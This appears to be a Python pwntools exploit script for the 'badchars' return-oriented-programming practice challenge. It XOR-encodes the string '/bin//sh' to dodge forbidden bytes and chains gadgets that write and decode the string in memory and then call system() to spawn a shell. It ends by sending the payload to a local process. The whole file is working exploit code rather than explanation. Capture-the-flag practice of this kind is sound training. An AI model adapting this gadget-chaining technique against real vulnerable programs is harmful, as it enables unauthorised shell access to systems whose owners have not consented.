from pwn import *

# '0x620x690x630x200x660x6e0x73' 

# ropper -b '626963666e7320' --file ./badchars32
# '0x62 0x69 0x63 0x20 0x66 0x6e 0x73'
# b i c / <space> f n s
def xor(string, key):
  ret = ""
  for i in string:
    ret += str(chr(ord(i) ^ key))
  return ret

data = 0x601074

system = 0x00000000004009e8

# Doesn't result in getting chars with b i c / <space> f n s for /bin//sh
key = 0x03
 
def writebinsh(key):
  key = 0x03
  binsh = xor("/bin//sh", key);
  ret = ""  

  ret += p64(0x0000000000400b3b) # pop r12; pop r13; ret;
  ret += binsh
  ret += p64(data)
  ret += p64(0x0000000000400b34) # mov qword ptr [r13], r12; ret;
  return ret

# xor for every byte with the same key.
def remote_unxor(string, key, data):
  ret = ""
  for i in range(0,len(string)):
    ret += p64(0x0000000000400b40)  # pop r14; pop r15; ret;
    ret += p64(key); 
    ret += p64(data + i)  # this is where our string is located after writebinsh 
    ret += p64(0x0000000000400b30)  # xor byte ptr [r15], r14b; ret;
  return ret

def CallSystem(systemaddr):
  ret = ""
  ret += p64(0x0000000000400b39)  # pop rdi; ret;
  ret += p64(data)
  ret += p64(system)
  return ret
  
pad = 'A'*40

ret = ""

ret += writebinsh(key)
ret += remote_unxor("/bin//sh", key, data)
ret += CallSystem(system)

payload = pad + ret

print payload

elf = ELF('badchars')

io = process(elf.path)
io.recvuntil("> ")
io.sendline(payload)
io.interactive()

